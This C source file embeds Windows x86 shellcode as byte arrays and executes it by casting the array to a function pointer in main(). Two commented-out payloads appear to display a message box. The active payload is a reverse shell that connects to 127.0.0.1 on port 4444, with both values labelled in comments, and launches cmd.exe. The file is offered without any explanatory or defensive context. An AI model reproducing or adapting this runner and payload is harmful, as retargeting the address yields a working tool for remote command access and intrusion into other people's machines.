#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
char *shellcode =
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b" 
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b" 
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24" 
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a" 
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0" 
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c" 
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a" 
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2" 
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f" 
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52" 
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33" 
"\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56" 
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52" 
"\xe8\x61\xff\xff\xff\x68\x58\x20\x20\x20\x68\x49\x53\x43\x43" 
"\x31\xdb\x88\x5c\x24\x04\x89\xe3\x68\x58\x20\x20\x20\x68\x49" 
"\x53\x43\x43\x31\xc9\x88\x4c\x24\x04\x89\xe1\x31\xd2\x52\x53" 
"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";


*/
/*
char *shellcode = 
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
"\xe8\x61\xff\xff\xff\x68\x58\x20\x20\x20\x68\x49\x53\x43\x43"
"\x31\xdb\x88\x5c\x24\x04\x89\xe3\x68\x58\x20\x20\x20\x68\x49"
"\x53\x43\x43\x31\xc9\x88\x4c\x24\x04\x89\xe1\x31\xd2\x52\x53"
"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";
*/



char shellcode[] = 
"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" 
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" 
"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" 
"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" 
"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" 
"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" 
"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" 
"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" 
"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" 
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" 
"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" 
"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" 
"\xD5\x89\xC7\x68" 
"\x7F\x00\x00\x01"     //ip     0x7F000001 = 127.0.0.1
"\x68\x02\x00"									
"\x11\x5C"            //port    0x115c = 4444
"\x89\xE6\x6A"
"\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89" 
"\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24" 
"\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46" 
"\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E" 
"\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A" 
"\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05" 
"\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5";


int main(){

	void(*func)(void) = (void(*)(void))shellcode;
	func();

}